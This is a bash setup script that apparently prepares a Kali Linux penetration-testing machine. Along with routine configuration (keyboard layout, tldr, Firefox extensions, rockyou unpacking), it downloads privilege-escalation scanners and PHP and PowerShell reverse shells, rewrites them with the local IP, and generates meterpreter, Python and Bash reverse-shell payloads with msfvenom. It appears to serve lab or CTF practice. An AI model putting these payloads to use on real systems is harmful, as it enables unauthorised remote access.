#!/bin/bash

INSTALL_ZSH=false

# Determine the package manager
if command -v apt &> /dev/null; then
    PKG_MANAGER="apt"
    UPDATE_CMD="sudo apt update"
    INSTALL_CMD="sudo apt install -y"
elif command -v dnf &> /dev/null; then
    PKG_MANAGER="dnf"
    UPDATE_CMD="sudo dnf check-update"
    INSTALL_CMD="sudo dnf install -y"
elif command -v pacman &> /dev/null; then
    PKG_MANAGER="pacman"
    UPDATE_CMD="sudo pacman -Sy"
    INSTALL_CMD="sudo pacman -Sy"
else
    echo "Unsupported package manager. Exiting."
    exit 1
fi

# Fix kalis signing-key
sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg

echo "Get required files..."
while getopts "t" opt; do
    case $opt in
      t) INSTALL_ZSH=true ;;
      \?) echo "Invalid option -$OPTARG" >&2; exit 1 ;;
    esac
done

if $INSTALL_ZSH; then
	git clone https://github.com/Obedaya/obedssetupscript
	cd obedssetupscript
	chmod +x setup.sh
	./setup.sh -t
	cd ..
fi

echo "Getting tools"

mkdir ./Tools
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh >> ./Tools/linpeas.sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe >> ./Tools/winPEAS.exe
curl -L https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php >> ./Tools/revshell.php
curl -L https://raw.githubusercontent.com/martinsohn/PowerShell-reverse-shell/refs/heads/main/powershell-reverse-shell.ps1 >> ./Tools/revshell.ps1
curl -L https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1 >> ./Tools/privesccheck.ps1

# Change IP of revshells
# PHP Revshell

IP=$(ip addr show eth1 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)

SCRIPT="./Tools/revshell.php"

sed -i "s/\(\$ip = '\)[^']*\(';\)/\1$IP\2/" "$SCRIPT"
sed -i "s/\(\$port = \)[0-9]*\(;.*\)/\15555\2/" "$SCRIPT"

# Powershell Revshell

SCRIPT="./Tools/revshell.ps1"

sed -i "s|TCPClient('.*', [0-9]\+)|TCPClient('$IP', 6666)|" "$SCRIPT"


echo "Creating reverse shells..."
echo "USING $IP for reverse shells! If this is incorrect please execute the script 'createreverseshells.sh' in the Tools folder with the right IP!"

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=$IP LPORT=7777 -o ./Tools/revshell.exe
msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=8888 -f raw > ./Tools/revshell.py
msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=9999 -f raw > ./Tools/revshell.sh

$UPDATE_CMD

echo "Installing tldr..."

$INSTALL_CMD tealdeer

tldr --update

echo "Unpacking rockyou..."
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

echo "Setting German keyboard layout..."
sudo sed -i 's/XKBLAYOUT="us"/XKBLAYOUT="de"/g' /etc/default/keyboard
sudo dpkg-reconfigure -phigh keyboard-configuration
setxkbmap de

if ! grep -q "setxkbmap de" ~/.zshrc; then
  echo "setxkbmap de" >> ~/.zshrc
fi

echo "Installing browser extensions"

sudo mkdir -p /etc/firefox-esr/policies

# Create policies.json with force-installed extensions
cat <<EOF | sudo tee /etc/firefox-esr/policies/policies.json >/dev/null
{
  "policies": {
    "ExtensionSettings": {
      "wappalyzer@crunchlabz.com": {
        "installation_mode": "force_installed",
        "install_url": "https://addons.mozilla.org/firefox/downloads/latest/wappalyzer/latest.xpi"
      },
      "{f1423c11-a4e2-4709-a0f8-6d6a68c83d08}": {
        "installation_mode": "force_installed",
        "install_url": "https://addons.mozilla.org/firefox/downloads/latest/hacktools/latest.xpi"
      }
    }
  }
}
EOF

echo "Updating nmap scripts"
sudo nmap --script-updatedb

echo "Done!"
